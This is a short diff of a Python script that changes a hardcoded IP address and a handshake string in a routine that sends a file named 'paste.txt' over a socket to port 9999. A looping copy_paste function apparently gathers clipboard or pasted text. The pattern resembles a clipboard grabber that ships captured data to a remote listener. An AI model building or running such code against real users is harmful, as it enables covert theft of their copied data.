@@ -6,7 +6,7 @@ import datetime
 import socket
 
 
-ip = "192.168.1.18"
+ip = "192.168.1.72"
 def copy_paste(a):
     list = []
     while True:    
@@ -45,7 +45,7 @@ def sendFile():
 	
 	s.connect((ip, 9999))
 	with open('paste.txt', 'rb') as file:
-		s.send("Get checker file".encode('ascii'))
+		s.send("copypaste".encode('ascii'))
 		l = file.read(1024)
 		while (l):
 			s.send(l)
